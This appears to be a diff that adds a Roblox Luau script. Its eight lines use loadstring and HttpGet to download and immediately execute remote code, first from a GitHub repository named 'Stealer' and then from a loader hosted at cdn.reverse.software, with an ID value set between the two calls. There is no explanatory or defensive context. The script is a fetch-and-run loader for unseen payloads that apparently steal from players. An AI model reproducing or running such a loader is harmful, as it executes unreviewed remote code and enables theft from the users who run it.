@@ -1,0 +1,8 @@
+loadstring([[
+-- Loading screen first
+loadstring(game:HttpGet("https://raw.githubusercontent.com/myboykjs-dot/Stealer/refs/heads/main/Loading%20screen"))()
+
+-- Then main script
+local ID="1cd9f112-78c3-42b2-8c2e-e85e187dc50d"
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+]])()
